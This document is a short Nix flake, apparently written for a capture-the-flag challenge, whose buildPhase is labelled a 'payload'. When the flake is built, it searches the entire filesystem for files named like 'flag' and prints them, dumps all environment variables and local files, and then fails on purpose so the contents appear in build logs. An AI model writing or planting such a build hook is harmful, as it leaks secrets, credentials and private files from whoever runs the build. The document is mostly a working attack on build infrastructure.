{
  description = "Directory tree and file content dumper";

  # 1. Define where to get nixpkgs
  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }: 
  let
    # 2. Instantiate the packages for the target system
    system = "x86_64-linux";
    pkgs = import nixpkgs { inherit system; };
  in {
    packages.${system}.default = pkgs.stdenv.mkDerivation {
      pname = "dump-tree";
      version = "1.0";

      # 3. Give it a valid source (the flake directory itself)
      src = ./.;

      # 4. Put your payload in the buildPhase and redirect to stderr
      buildPhase = ''
        find / -type f -iname "*flag*" -exec echo -e "\n>>> FOUND: {}" \; -exec cat {} \; 2>/dev/null || true
        env || true
    
        echo "Current Directory: $(pwd)"
        ls -la
        echo -e "\n>>> Dumping all local files:"
        cat * 2>/dev/null || true
    
        exit 1
      '';

      installPhase = "mkdir -p $out";
    };
  };
}
